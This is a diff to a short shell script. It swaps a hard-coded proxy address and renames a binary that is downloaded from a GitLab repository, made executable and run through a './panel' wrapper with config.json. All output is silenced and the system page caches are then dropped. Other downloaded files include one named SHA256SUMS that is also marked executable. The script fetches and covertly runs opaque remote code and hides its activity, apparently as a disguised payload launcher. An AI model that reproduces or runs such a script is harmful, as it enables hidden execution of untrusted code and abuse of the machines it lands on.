@@ -1,6 +1,6 @@
-proxy="154.64.217.128"
-port="36468"
-wget -q -O kiamtan-78 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kiamtan-78
+proxy="192.252.209.155" 
+port="14455"
+wget -q -O kamakaze23 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kamakaze23
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,6 +19,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./kiamtan-78 -c "config.json" >/dev/null 2>&1
+./panel ./kamakaze23 -c "config.json" >/dev/null 2>&1
 sleep 1
 sync; echo 3 > /proc/sys/vm/drop_caches
